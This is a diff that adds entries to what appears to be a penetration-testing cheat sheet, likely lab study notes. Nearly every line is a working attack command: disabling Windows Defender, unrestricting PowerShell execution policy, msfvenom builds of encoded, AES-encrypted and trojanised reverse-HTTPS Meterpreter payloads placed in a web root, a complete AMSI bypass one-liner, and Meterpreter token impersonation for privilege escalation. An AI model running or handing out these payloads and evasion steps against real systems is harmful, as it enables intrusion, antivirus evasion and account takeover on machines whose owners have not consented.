@@ -12,3 +12,33 @@ Copy File:
 
 Disable Windows Defender:
 PS> Set-MpPreference -DisableRealtimeMonitoring $true
+
+Powershell Exc Policy
+PS> Set-ExecutionPolicy -ExecutionPolicy Unrestricted
+
+Encoded Payloads
+
+sudo msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -e x86/shikata_ga_nai -f exe -o /var/www/html/met.exe
+sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/met64.exe
+sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.176.134 LPORT=443 -e x64/zutto_dekiru -x /home/kali/notepad.exe -f exe -o /var/www/html/met64_notepad.exe
+
+Encrypters:
+sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43 -f exe -o /var/www/html/met64_aes.exe
+
+AMSI Bypass:
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+
+Meterpreter Priv Escalation:
+    meterpreter > load incognito
+    meterpreter > list_tokens -u
+        corp1\admin
+        IIS APPPOOL\DefaultAppPool
+        NT AUTHORITY\IUSR
+        NT AUTHORITY\LOCAL SERVICE
+        NT AUTHORITY\NETWORK SERVICE
+        NT AUTHORITY\SYSTEM
+        NT SERVICE\SQLTELEMETRY$SQLEXPRESS
+        Window Manager\DWM-1
+  meterpreter > impersonate_token corp1\\admin
+  impersonate_token corp1\\admin
+  getuid
